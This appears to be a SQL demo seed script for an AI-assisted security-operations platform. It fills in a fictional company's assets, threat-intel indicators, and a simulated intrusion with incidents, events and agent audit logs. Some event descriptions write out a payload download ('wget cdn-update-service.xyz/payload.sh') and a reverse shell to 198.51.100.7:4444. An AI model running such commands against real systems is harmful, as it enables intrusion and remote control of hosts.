BEGIN;

SET LOCAL audit_logs.allow_mutation = 'on';
SET LOCAL session_replication_role = 'replica';   -- skip FK to auth.users for demo profiles


-- 1. CLEAN UP
DELETE FROM public.organizations WHERE slug = 'acme-corp';


-- 2. ORGANIZATION
INSERT INTO public.organizations (id, name, slug, plan, status, billing_email, settings)
VALUES (
  '00000000-0000-0000-0000-00000000ac01'::uuid,
  'Acme Corporation',
  'acme-corp',
  'enterprise',
  'active',
  'security@acme.example',
  '{"timezone":"UTC","notifications":{"discord":true,"email":true},"mitre_version":"v15"}'::jsonb
);


-- 3. USERS
INSERT INTO public.users (id, organization_id, email, full_name, role, status, avatar_url, last_seen_at)
VALUES
  ('00000000-0000-0000-0000-00000000a001'::uuid,
   '00000000-0000-0000-0000-00000000ac01'::uuid,
   'jane.morrison@acme.example', 'Jane Morrison', 'owner',   'active',
   'https://api.dicebear.com/7.x/initials/svg?seed=Jane%20Morrison',
   NOW() - INTERVAL '4 minutes'),

  ('00000000-0000-0000-0000-00000000a002'::uuid,
   '00000000-0000-0000-0000-00000000ac01'::uuid,
   'marcus.chen@acme.example',   'Marcus Chen',   'analyst', 'active',
   'https://api.dicebear.com/7.x/initials/svg?seed=Marcus%20Chen',
   NOW() - INTERVAL '12 minutes'),

  ('00000000-0000-0000-0000-00000000a003'::uuid,
   '00000000-0000-0000-0000-00000000ac01'::uuid,
   'priya.shah@acme.example',    'Priya Shah',    'viewer',  'active',
   'https://api.dicebear.com/7.x/initials/svg?seed=Priya%20Shah',
   NOW() - INTERVAL '2 hours');


-- 4. ASSETS
INSERT INTO public.assets (
  id, organization_id, name, asset_type, environment, criticality,
  ip_address, hostname, operating_system, os_version, owner_user_id, tags, status, last_seen_at
) VALUES
  ('00000000-0000-0000-0000-00000000b001'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'prod-web-01', 'server', 'production', 'high',
   '10.0.1.10'::inet, 'prod-web-01.acme.internal', 'Ubuntu', '22.04',
   '00000000-0000-0000-0000-00000000a002'::uuid, ARRAY['public-facing','pci-dss','payments'],
   'active', NOW() - INTERVAL '30 seconds'),

  ('00000000-0000-0000-0000-00000000b002'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'prod-web-02', 'server', 'production', 'high',
   '10.0.1.11'::inet, 'prod-web-02.acme.internal', 'Ubuntu', '22.04',
   '00000000-0000-0000-0000-00000000a002'::uuid, ARRAY['public-facing','pci-dss','payments'],
   'active', NOW() - INTERVAL '45 seconds'),

  ('00000000-0000-0000-0000-00000000b003'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'db-prod-master', 'database', 'production', 'crown_jewel',
   '10.0.2.5'::inet, 'db-prod-master.acme.internal', 'PostgreSQL', '15.5',
   '00000000-0000-0000-0000-00000000a002'::uuid, ARRAY['pii','pci-dss','restricted'],
   'active', NOW() - INTERVAL '15 seconds'),

  ('00000000-0000-0000-0000-00000000b004'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'aws-prod-account', 'cloud', 'production', 'crown_jewel',
   NULL, 'acme-prod.aws', 'AWS', NULL,
   '00000000-0000-0000-0000-00000000a001'::uuid, ARRAY['aws','prod','iam-managed'],
   'active', NOW() - INTERVAL '5 minutes'),

  ('00000000-0000-0000-0000-00000000b005'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'edge-firewall-01', 'network', 'production', 'high',
   '203.0.113.1'::inet, 'fw-01.acme.com', 'PaloAlto PAN-OS', '11.0',
   '00000000-0000-0000-0000-00000000a002'::uuid, ARRAY['perimeter','firewall'],
   'active', NOW() - INTERVAL '10 seconds'),

  ('00000000-0000-0000-0000-00000000b006'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'github-acme', 'saas', 'production', 'high',
   NULL, 'github.com/acme', 'GitHub Enterprise', NULL,
   '00000000-0000-0000-0000-00000000a001'::uuid, ARRAY['source-code','iam-managed'],
   'active', NOW() - INTERVAL '1 minute'),

  ('00000000-0000-0000-0000-00000000b007'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'okta-tenant', 'saas', 'production', 'crown_jewel',
   NULL, 'acme.okta.com', 'Okta', NULL,
   '00000000-0000-0000-0000-00000000a001'::uuid, ARRAY['idp','iam','sso'],
   'active', NOW() - INTERVAL '20 seconds'),

  ('00000000-0000-0000-0000-00000000b008'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'laptop-jane', 'endpoint', 'production', 'medium',
   '10.10.5.42'::inet, 'JANE-MBP-001', 'macOS', '14.4',
   '00000000-0000-0000-0000-00000000a001'::uuid, ARRAY['endpoint','exec'],
   'active', NOW() - INTERVAL '3 minutes'),

  ('00000000-0000-0000-0000-00000000b009'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'laptop-marcus', 'endpoint', 'production', 'medium',
   '10.10.5.51'::inet, 'MARCUS-WIN-001', 'Windows', '11 23H2',
   '00000000-0000-0000-0000-00000000a002'::uuid, ARRAY['endpoint','analyst'],
   'active', NOW() - INTERVAL '7 minutes'),

  ('00000000-0000-0000-0000-00000000b010'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'staging-web', 'server', 'staging', 'low',
   '10.20.1.10'::inet, 'staging-web.acme.internal', 'Ubuntu', '22.04',
   '00000000-0000-0000-0000-00000000a002'::uuid, ARRAY['staging','dev'],
   'inactive', NOW() - INTERVAL '2 days');


-- 5. IOCS  ← FIX: explicit normalized_value because session_replication_role='replica' disables triggers
INSERT INTO public.iocs (
  organization_id, ioc_type, value, normalized_value, reputation, confidence, threat_score,
  tags, source_feeds, enrichment, geo_country, geo_city, asn, times_seen
) VALUES
  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'ipv4', '203.0.113.42', '203.0.113.42', 'malicious', 95, 92,
   ARRAY['botnet','brute-force','ssh'], ARRAY['abuseipdb','otx'],
   '{"abuseipdb":{"confidence":95,"reports":1247},"otx":{"pulses":18}}'::jsonb,
   'RU', 'Moscow', 12389, 47),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'ipv4', '203.0.113.99', '203.0.113.99', 'malicious', 88, 85,
   ARRAY['botnet','scanning'], ARRAY['abuseipdb','shodan'],
   '{"abuseipdb":{"confidence":88,"reports":892}}'::jsonb,
   'RU', 'St Petersburg', 12389, 22),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'ipv4', '198.51.100.7', '198.51.100.7', 'malicious', 90, 88,
   ARRAY['c2','apt29','exfiltration'], ARRAY['otx','virustotal'],
   '{"otx":{"pulses":34,"actor":"APT29"}}'::jsonb,
   'CN', 'Shenzhen', 4134, 9),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'ipv4', '198.51.100.55', '198.51.100.55', 'suspicious', 65, 60,
   ARRAY['scanning','reconnaissance'], ARRAY['abuseipdb'],
   '{}'::jsonb, 'CN', 'Beijing', 4134, 4),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'ipv4', '175.45.176.12', '175.45.176.12', 'malicious', 92, 90,
   ARRAY['apt38','lazarus','financial'], ARRAY['otx'],
   '{"otx":{"pulses":22,"actor":"Lazarus Group"}}'::jsonb,
   'KP', 'Pyongyang', 131279, 3),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'domain', 'acme-secure-login.com', 'acme-secure-login.com', 'malicious', 98, 96,
   ARRAY['phishing','typosquat'], ARRAY['virustotal','otx'],
   '{"virustotal":{"detections":47}}'::jsonb,
   NULL, NULL, NULL, 12),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'domain', 'acme-support-portal.io', 'acme-support-portal.io', 'malicious', 94, 91,
   ARRAY['phishing','credential-theft'], ARRAY['virustotal'],
   '{"virustotal":{"detections":38}}'::jsonb,
   NULL, NULL, NULL, 6),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'domain', 'cdn-update-service.xyz', 'cdn-update-service.xyz', 'malicious', 89, 87,
   ARRAY['c2','beacon'], ARRAY['otx','virustotal'],
   '{}'::jsonb, NULL, NULL, NULL, 8),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'sha256',
   'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
   'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
   'malicious', 96, 94,
   ARRAY['ransomware','cobalt-strike'], ARRAY['virustotal'],
   '{"virustotal":{"detections":58,"family":"CobaltStrike"}}'::jsonb,
   NULL, NULL, NULL, 2),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'sha256',
   'a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456',
   'a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456',
   'malicious', 91, 89,
   ARRAY['credential-stealer'], ARRAY['virustotal'],
   '{"virustotal":{"detections":42,"family":"RedLine"}}'::jsonb,
   NULL, NULL, NULL, 1),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'url',
   'http://acme-secure-login.com/sso/auth',
   'http://acme-secure-login.com/sso/auth',
   'malicious', 97, 95,
   ARRAY['phishing','credential-harvest'], ARRAY['virustotal'],
   '{}'::jsonb, NULL, NULL, NULL, 4),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'cve', 'CVE-2024-3094', 'CVE-2024-3094', 'malicious', 100, 98,
   ARRAY['supply-chain','xz-backdoor'], ARRAY['nvd','otx'],
   '{"cvss":10.0,"description":"XZ Utils backdoor"}'::jsonb,
   NULL, NULL, NULL, 1),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'ipv4', '8.8.8.8', '8.8.8.8', 'benign', 99, 0,
   ARRAY['google','dns'], ARRAY['manual'],
   '{"description":"Google Public DNS"}'::jsonb,
   'US', 'Mountain View', 15169, 0),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'domain', 'github.com', 'github.com', 'benign', 99, 0,
   ARRAY['trusted','dev-tooling'], ARRAY['manual'],
   '{}'::jsonb, NULL, NULL, NULL, 0),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, 'ipv4', '185.220.100.240', '185.220.100.240', 'suspicious', 55, 50,
   ARRAY['tor-exit'], ARRAY['otx'],
   '{}'::jsonb, 'DE', 'Frankfurt', 197540, 7);


-- 6. THREATS
INSERT INTO public.threats (
  id, organization_id, short_id, primary_asset_id, incident_id, title, description,
  severity, status, confidence, risk_score, mitre_tactics, mitre_techniques,
  source_ips, target_ips, affected_users, tags, assigned_to, detected_at
)
SELECT * FROM (VALUES
  ('00000000-0000-0000-0000-00000000d001'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid, 'THR-AC0001',
   '00000000-0000-0000-0000-00000000b001'::uuid, '00000000-0000-0000-0000-00000000c001'::uuid,
   'SSH brute-force from Russian botnet against prod-web-01',
   'Sustained SSH brute-force attempts (~1,200 attempts/hour) from 203.0.113.42, 203.0.113.99 targeting root and ubuntu accounts.',
   'high'::public.severity_level, 'investigating'::public.status_level, 87, 82,
   ARRAY['TA0001','TA0006'], ARRAY['T1110','T1110.001'],
   ARRAY['203.0.113.42'::inet, '203.0.113.99'::inet], ARRAY['10.0.1.10'::inet], ARRAY['root','ubuntu'],
   ARRAY['brute-force','ssh','network'], '00000000-0000-0000-0000-00000000a002'::uuid,
   NOW() - INTERVAL '2 hours 45 minutes'),

  ('00000000-0000-0000-0000-00000000d002'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid, 'THR-AC0002',
   '00000000-0000-0000-0000-00000000b001'::uuid, '00000000-0000-0000-0000-00000000c001'::uuid,
   'Successful SSH login followed by suspicious wget',
   'Login as "ubuntu" from 203.0.113.42 succeeded at 02:14 UTC, immediately followed by wget of cdn-update-service.xyz/payload.sh.',
   'critical'::public.severity_level, 'investigating'::public.status_level, 93, 95,
   ARRAY['TA0001','TA0002'], ARRAY['T1078','T1059.004'],
   ARRAY['203.0.113.42'::inet], ARRAY['10.0.1.10'::inet], ARRAY['ubuntu'],
   ARRAY['c2','initial-access','execution'], '00000000-0000-0000-0000-00000000a002'::uuid,
   NOW() - INTERVAL '2 hours 32 minutes'),

  ('00000000-0000-0000-0000-00000000d003'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid, 'THR-AC0003',
   '00000000-0000-0000-0000-00000000b001'::uuid, '00000000-0000-0000-0000-00000000c001'::uuid,
   'Encoded PowerShell-equivalent payload execution on prod-web-01',
   'Base64-encoded bash payload executed via curl. Decoded payload establishes reverse shell to 198.51.100.7:4444.',
   'critical'::public.severity_level, 'open'::public.status_level, 91, 93,
   ARRAY['TA0002','TA0011'], ARRAY['T1059.004','T1071.001'],
   ARRAY['198.51.100.7'::inet], ARRAY['10.0.1.10'::inet], ARRAY['ubuntu'],
   ARRAY['reverse-shell','c2','apt29'], '00000000-0000-0000-0000-00000000a002'::uuid,
   NOW() - INTERVAL '2 hours 18 minutes'),

  ('00000000-0000-0000-0000-00000000d004'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid, 'THR-AC0004',
   '00000000-0000-0000-0000-00000000b003'::uuid, '00000000-0000-0000-0000-00000000c001'::uuid,
   'Suspicious database query patterns indicating reconnaissance',
   'Sequential SELECT * queries against information_schema followed by full-table scans on customers and payment_methods.',
   'high'::public.severity_level, 'open'::public.status_level, 84, 80,
   ARRAY['TA0007','TA0009'], ARRAY['T1083','T1213'],
   ARRAY['10.0.1.10'::inet], ARRAY['10.0.2.5'::inet], ARRAY['ubuntu'],
   ARRAY['reconnaissance','database','pii-risk'], '00000000-0000-0000-0000-00000000a002'::uuid,
   NOW() - INTERVAL '1 hour 50 minutes'),

  ('00000000-0000-0000-0000-00000000d005'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid, 'THR-AC0005',
   '00000000-0000-0000-0000-00000000b008'::uuid, NULL,
   'Phishing email click from CEO laptop',
   'Jane Morrison clicked acme-secure-login.com from a phishing email. No credentials submitted.',
   'medium'::public.severity_level, 'contained'::public.status_level, 78, 65,
   ARRAY['TA0001'], ARRAY['T1566.002'],
   ARRAY[]::inet[], ARRAY['10.10.5.42'::inet], ARRAY['jane.morrison@acme.example'],
   ARRAY['phishing','email','executive'], '00000000-0000-0000-0000-00000000a002'::uuid,
   NOW() - INTERVAL '4 hours'),

  ('00000000-0000-0000-0000-00000000d006'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid, 'THR-AC0006',
   '00000000-0000-0000-0000-00000000b004'::uuid, NULL,
   'S3 bucket made public in production AWS account',
   'CloudTrail recorded PutBucketAcl making s3://acme-customer-exports publicly readable. Bucket contains PII.',
   'high'::public.severity_level, 'resolved'::public.status_level, 96, 88,
   ARRAY['TA0010'], ARRAY['T1530'],
   ARRAY[]::inet[], ARRAY[]::inet[], ARRAY['svc-ci-deployer'],
   ARRAY['aws','misconfiguration','pii'], '00000000-0000-0000-0000-00000000a001'::uuid,
   NOW() - INTERVAL '1 day 3 hours'),

  ('00000000-0000-0000-0000-00000000d007'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid, 'THR-AC0007',
   '00000000-0000-0000-0000-00000000b007'::uuid, '00000000-0000-0000-0000-00000000c002'::uuid,
   'Impossible-travel login to Okta from RU and US within 8 minutes',
   'Marcus Chen logged in from Moscow at 11:02 UTC and Seattle at 11:10 UTC — physically impossible.',
   'high'::public.severity_level, 'resolved'::public.status_level, 92, 85,
   ARRAY['TA0001'], ARRAY['T1078.004'],
   ARRAY['203.0.113.42'::inet], ARRAY[]::inet[], ARRAY['marcus.chen@acme.example'],
   ARRAY['identity','impossible-travel'], '00000000-0000-0000-0000-00000000a001'::uuid,
   NOW() - INTERVAL '5 days 2 hours'),

  ('00000000-0000-0000-0000-00000000d008'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid, 'THR-AC0008',
   '00000000-0000-0000-0000-00000000b007'::uuid, '00000000-0000-0000-0000-00000000c002'::uuid,
   'OAuth token grant for unknown third-party app',
   'A new OAuth grant was issued to "DataDrip Analytics" with org-wide read scope. App not in approved registry.',
   'medium'::public.severity_level, 'resolved'::public.status_level, 80, 70,
   ARRAY['TA0003'], ARRAY['T1098.001'],
   ARRAY[]::inet[], ARRAY[]::inet[], ARRAY['marcus.chen@acme.example'],
   ARRAY['oauth','persistence','iam'], '00000000-0000-0000-0000-00000000a001'::uuid,
   NOW() - INTERVAL '5 days 1 hour')
) AS t(id, organization_id, short_id, primary_asset_id, incident_id, title, description,
       severity, status, confidence, risk_score, mitre_tactics, mitre_techniques,
       source_ips, target_ips, affected_users, tags, assigned_to, detected_at);


-- 7. INCIDENTS
INSERT INTO public.incidents (
  id, organization_id, short_id, title, description,
  severity, status, priority, confidence, risk_score,
  threat_count, asset_count, kill_chain, mitre_tactics, mitre_techniques,
  affected_asset_ids, source_ips, attribution, tags, assigned_to,
  first_seen_at, last_seen_at
) VALUES
  ('00000000-0000-0000-0000-00000000c001'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'INC-ACT001',
   'Suspected APT29 intrusion via SSH brute-force chain',
   'Coordinated attack starting with SSH brute-force from Russian infrastructure, escalating to successful login, payload execution, C2 establishment, and database reconnaissance. Attribution points to APT29 TTPs.',
   'critical'::public.severity_level, 'investigating'::public.status_level, 'p1'::public.incident_priority,
   91, 94, 4, 2,
   ARRAY['TA0001','TA0002','TA0011','TA0007','TA0009'],
   ARRAY['TA0001','TA0002','TA0006','TA0007','TA0009','TA0011'],
   ARRAY['T1110','T1110.001','T1078','T1059.004','T1071.001','T1083','T1213'],
   ARRAY['00000000-0000-0000-0000-00000000b001'::uuid, '00000000-0000-0000-0000-00000000b003'::uuid],
   ARRAY['203.0.113.42'::inet, '203.0.113.99'::inet, '198.51.100.7'::inet],
   '{"actor":"APT29","alias":"Cozy Bear","campaign":"NOBELIUM-2024","attribution_confidence":0.75}'::jsonb,
   ARRAY['apt29','active','critical','data-exfil-risk'],
   '00000000-0000-0000-0000-00000000a002'::uuid,
   NOW() - INTERVAL '2 hours 45 minutes', NOW() - INTERVAL '12 minutes'),

  ('00000000-0000-0000-0000-00000000c002'::uuid, '00000000-0000-0000-0000-00000000ac01'::uuid,
   'INC-ACT002',
   'Marcus Chen account compromise via stolen Okta session',
   'Marcus Chen''s Okta session was hijacked, resulting in unauthorized OAuth grant to an unknown third-party app. Session revoked, MFA reset, OAuth grant removed. Root cause: laptop infostealer infection.',
   'high'::public.severity_level, 'resolved'::public.status_level, 'p2'::public.incident_priority,
   89, 78, 2, 1,
   ARRAY['TA0001','TA0003'],
   ARRAY['TA0001','TA0003'],
   ARRAY['T1078.004','T1098.001'],
   ARRAY['00000000-0000-0000-0000-00000000b007'::uuid],
   ARRAY['203.0.113.42'::inet],
   '{"actor":"unknown","root_cause":"infostealer"}'::jsonb,
   ARRAY['identity','iam','resolved'],
   '00000000-0000-0000-0000-00000000a001'::uuid,
   NOW() - INTERVAL '5 days 2 hours', NOW() - INTERVAL '4 days 18 hours');

UPDATE public.incidents
SET contained_at = NOW() - INTERVAL '5 days 1 hour',
    resolved_at  = NOW() - INTERVAL '4 days 18 hours'
WHERE id = '00000000-0000-0000-0000-00000000c002'::uuid;


-- 8. EVENTS
INSERT INTO public.events (
  organization_id, asset_id, source, event_type, severity, title,
  source_ip, destination_ip, username, threat_id, processed, observed_at
)
SELECT
  '00000000-0000-0000-0000-00000000ac01'::uuid,
  '00000000-0000-0000-0000-00000000b001'::uuid,
  'authentication'::public.event_source,
  'authentication.failed',
  'low'::public.severity_level,
  'Failed SSH login attempt for ' || u,
  src_ip::inet,
  '10.0.1.10'::inet,
  u,
  '00000000-0000-0000-0000-00000000d001'::uuid,
  TRUE,
  NOW() - (random() * INTERVAL '3 hours')
FROM (
  SELECT u, src_ip FROM (VALUES
    ('root',   '203.0.113.42'),
    ('ubuntu', '203.0.113.42'),
    ('admin',  '203.0.113.42'),
    ('root',   '203.0.113.99'),
    ('ubuntu', '203.0.113.99'),
    ('postgres','203.0.113.42'),
    ('git',    '203.0.113.99'),
    ('test',   '203.0.113.42')
  ) AS x(u, src_ip)
) AS data
CROSS JOIN generate_series(1, 5);

INSERT INTO public.events (
  organization_id, asset_id, source, event_type, severity, title, description,
  source_ip, destination_ip, username, threat_id, processed, observed_at
) VALUES
  ('00000000-0000-0000-0000-00000000ac01'::uuid, '00000000-0000-0000-0000-00000000b001'::uuid,
   'authentication', 'authentication.success', 'medium',
   'Successful SSH login as ubuntu from Russian botnet IP',
   'Login from 203.0.113.42 succeeded after ~1,200 failed attempts in 47 minutes.',
   '203.0.113.42'::inet, '10.0.1.10'::inet, 'ubuntu',
   '00000000-0000-0000-0000-00000000d002'::uuid, TRUE,
   NOW() - INTERVAL '2 hours 32 minutes'),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, '00000000-0000-0000-0000-00000000b001'::uuid,
   'edr', 'process.suspicious', 'high',
   'wget invocation to known C2 domain',
   'wget cdn-update-service.xyz/payload.sh executed by ubuntu within 60s of login.',
   '10.0.1.10'::inet, '198.51.100.7'::inet, 'ubuntu',
   '00000000-0000-0000-0000-00000000d002'::uuid, TRUE,
   NOW() - INTERVAL '2 hours 31 minutes'),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, '00000000-0000-0000-0000-00000000b001'::uuid,
   'edr', 'process.encoded_payload', 'critical',
   'Base64-encoded bash payload executed on prod-web-01',
   'bash decoded a 8,432-char base64 string that established reverse shell to 198.51.100.7:4444.',
   '10.0.1.10'::inet, '198.51.100.7'::inet, 'ubuntu',
   '00000000-0000-0000-0000-00000000d003'::uuid, TRUE,
   NOW() - INTERVAL '2 hours 18 minutes'),

  ('00000000-0000-0000-0000-00000000ac01'::uuid, '00000000-0000-0000-0000-00000000b003'::uuid,
   'application', 'database.recon', 'high',
   'Sequential information_schema queries followed by sensitive table scan',
   'Queries fingerprinted database structure, then SELECTed all rows from customers and payment_methods.',
   '10.0.1.10'::inet, '10.0.2.5'::inet, 'webapp_readonly',
   '00000000-0000-0000-0000-00000000d004'::uuid, TRUE,
   NOW() - INTERVAL '1 hour 50 minutes');


-- 9. AGENT RUNS
INSERT INTO public.agent_runs (
  organization_id, agent_id, agent_key, trigger_type, trigger_id,
  status, model, prompt_tokens, completion_tokens, total_tokens,
  latency_ms, started_at, completed_at
)
SELECT
  '00000000-0000-0000-0000-00000000ac01'::uuid,
  a.id, a.agent_key, t.trigger_type::public.run_trigger_type, t.trigger_id::uuid,
  'completed'::public.run_status,
  'llama-3.3-70b-versatile',
  t.prompt_tokens, t.completion_tokens, t.prompt_tokens + t.completion_tokens,
  t.latency,
  NOW() - (t.ago::interval),
  NOW() - (t.ago::interval) + (t.latency || ' ms')::interval
FROM public.agents a
JOIN (VALUES
  ('triage',         'event',    '00000000-0000-0000-0000-00000000d001', 1240,  340, 280, '2 hours 45 minutes'),
  ('threat_intel',   'threat',   '00000000-0000-0000-0000-00000000d001', 1680,  520, 410, '2 hours 44 minutes'),
  ('triage',         'event',    '00000000-0000-0000-0000-00000000d002',  980,  280, 220, '2 hours 32 minutes'),
  ('threat_intel',   'threat',   '00000000-0000-0000-0000-00000000d002', 1520,  610, 480, '2 hours 30 minutes'),
  ('investigation',  'threat',   '00000000-0000-0000-0000-00000000d002', 2840, 1120, 920, '2 hours 25 minutes'),
  ('triage',         'event',    '00000000-0000-0000-0000-00000000d003', 1410,  460, 360, '2 hours 18 minutes'),
  ('response',       'threat',   '00000000-0000-0000-0000-00000000d003', 1820,  280, 240, '2 hours 16 minutes'),
  ('forensics',      'incident', '00000000-0000-0000-0000-00000000c001', 4320, 2810,1740, '1 hour 55 minutes'),
  ('triage',         'event',    '00000000-0000-0000-0000-00000000d004', 1150,  380, 290, '1 hour 50 minutes'),
  ('investigation',  'incident', '00000000-0000-0000-0000-00000000c001', 3210, 1490,1080, '1 hour 40 minutes'),
  ('hunt',           'scheduled', NULL,                                  2400, 1820, 980, '45 minutes'),
  ('compliance',     'scheduled', NULL,                                  3680, 4120,2210, '20 minutes')
) AS t(agent_key_in, trigger_type, trigger_id, prompt_tokens, completion_tokens, latency, ago)
  ON a.agent_key = t.agent_key_in::public.agent_key
 AND a.organization_id = '00000000-0000-0000-0000-00000000ac01'::uuid;


-- 10. AUDIT LOGS
SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'system',
  p_action          := 'organization.created',
  p_target_type     := 'organizations',
  p_target_id       := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_target_name     := 'Acme Corporation',
  p_severity        := 'info',
  p_reason          := 'Demo seed initialization'
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'user',
  p_actor_id        := '00000000-0000-0000-0000-00000000a001'::uuid,
  p_actor_email     := 'jane.morrison@acme.example',
  p_actor_name      := 'Jane Morrison',
  p_action          := 'auth.login_success',
  p_severity        := 'info',
  p_ip_address      := '10.10.5.42'::inet
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'agent',
  p_actor_name      := 'Triage Agent',
  p_action          := 'threat.created',
  p_target_type     := 'threats',
  p_target_id       := '00000000-0000-0000-0000-00000000d002'::uuid,
  p_target_short_id := 'THR-AC0002',
  p_target_name     := 'Successful SSH login followed by suspicious wget',
  p_severity        := 'critical',
  p_reason          := 'Promoted from event after Triage Agent classification'
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'agent',
  p_actor_name      := 'Investigation Agent',
  p_action          := 'incident.created',
  p_target_type     := 'incidents',
  p_target_id       := '00000000-0000-0000-0000-00000000c001'::uuid,
  p_target_short_id := 'INC-ACT001',
  p_target_name     := 'Suspected APT29 intrusion via SSH brute-force chain',
  p_severity        := 'critical',
  p_reason          := 'Investigation Agent correlated 4 threats into a single attack chain'
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'user',
  p_actor_id        := '00000000-0000-0000-0000-00000000a001'::uuid,
  p_actor_email     := 'jane.morrison@acme.example',
  p_actor_name      := 'Jane Morrison',
  p_action          := 'incident.assigned',
  p_target_type     := 'incidents',
  p_target_id       := '00000000-0000-0000-0000-00000000c001'::uuid,
  p_target_short_id := 'INC-ACT001',
  p_severity        := 'info',
  p_reason          := 'Assigned active APT29 incident to Marcus Chen for investigation'
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'agent',
  p_actor_name      := 'Response Agent',
  p_action          := 'playbook.executed',
  p_target_type     := 'playbooks',
  p_target_name     := 'Block Malicious IP',
  p_severity        := 'high',
  p_reason          := 'Auto-blocked 203.0.113.42 and 203.0.113.99 at edge firewall'
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'user',
  p_actor_id        := '00000000-0000-0000-0000-00000000a002'::uuid,
  p_actor_name      := 'Marcus Chen',
  p_action          := 'threat.status_changed',
  p_target_type     := 'threats',
  p_target_id       := '00000000-0000-0000-0000-00000000d005'::uuid,
  p_target_short_id := 'THR-AC0005',
  p_severity        := 'medium',
  p_changes         := '{"status":{"from":"open","to":"contained"}}'::jsonb,
  p_reason          := 'Email pulled, no credentials submitted'
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'agent',
  p_actor_name      := 'Forensics Agent',
  p_action          := 'incident.timeline_built',
  p_target_type     := 'incidents',
  p_target_id       := '00000000-0000-0000-0000-00000000c001'::uuid,
  p_target_short_id := 'INC-ACT001',
  p_severity        := 'info',
  p_reason          := 'Reconstructed 47-event timeline spanning 2h 18m'
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'agent',
  p_actor_name      := 'Hunt Agent',
  p_action          := 'agent.run_completed',
  p_severity        := 'info',
  p_reason          := 'Generated 3 hypotheses, no new threats surfaced in 7d window'
);

SELECT public.log_audit_event(
  p_organization_id := '00000000-0000-0000-0000-00000000ac01'::uuid,
  p_actor_type      := 'agent',
  p_actor_name      := 'Compliance Agent',
  p_action          := 'agent.run_completed',
  p_severity        := 'info',
  p_reason          := 'Generated weekly GDPR Article 33 readiness summary'
);


COMMIT;